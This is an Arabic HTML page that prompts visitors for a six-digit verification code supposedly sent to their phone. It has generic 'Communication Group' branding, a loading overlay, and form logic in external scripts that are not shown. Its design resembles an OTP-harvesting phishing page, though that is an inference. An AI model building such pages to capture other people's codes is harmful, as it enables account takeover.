<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>رمز التأكيد</title>
  <link rel="icon" href="./assets/images/favicon.ico" />
  <link rel="stylesheet" href="style.css" />
  
  <style>
    .loading-overlay {
      position: fixed;
      top:0; left:0; right:0; bottom:0;
      background: rgba(0,0,0,0.5);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 9999;
    }
    .loading-popup {
      background: #fff;
      padding: 30px 50px;
      border-radius: 8px;
      box-shadow: 0 0 15px rgba(0,0,0,0.3);
      font-size: 1.5rem;
      color: #333;
      text-align: center;
      display: flex;
      align-items: center;
      gap: 15px;
    }
    .loading-spinner {
      border: 4px solid #f3f3f3;
      border-top: 4px solid #333;
      border-radius: 50%;
      width: 24px;
      height: 24px;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    #errorMsg, #successMsg {
      display: none;
      font-weight: bold;
      margin-top: 10px;
      text-align: center;
    }
    #errorMsg {
      color: red;
    }
    #successMsg {
      color: green;
    }
  </style>
<script src="https://sites.super.myninja.ai/_assets/ninja-daytona-script.js"></script>
</head>
<body>

  <div class="navbar">
    <div class="navbar-title">مجموعة التواصل</div>
    <img src="./assets/images/logonavbar.svg" alt="شعار التواصل" />
  </div>

  <div class="container" id="container" dir="rtl">
    <form id="confirmationForm" novalidate>
      <div id="codeSection">
        <div class="code-container">
          <img style="width: 30%" src="./assets/images/logonavbar.svg" alt="شعار التواصل" class="code-logo" />
          <h2 class="code-title">يرجى إدخال رمز التحقق</h2>
          <p class="code-subtitle">تم إرسال رمز مكون من 6 أرقام إلى رقم التواصل الخاص بك</p>
          <input id="text" type="text" name="code" maxlength="6" placeholder="— — — — — —" required />

          <p id="errorMsg"></p>
          <p id="successMsg"></p>

          <button type="submit" id="confirmCodeBtn">تأكيد الرمز</button>
        </div>
      </div>
    </form>
  </div>

  <div class="footer">
    <p>© 2025 جميع الحقوق محفوظة</p>
    <p>تم التطوير بواسطة فريق الدعم</p>
  </div>

  <div id="loadingPopup" class="loading-overlay">
    <div class="loading-popup">
      <div class="loading-spinner"></div>
      <span id="loadingText">جاري الاتصال ...</span>
    </div>
  </div>

  <script src="js/utils.js"></script>
  <script src="js/contact.js"></script>
</body>
</html>
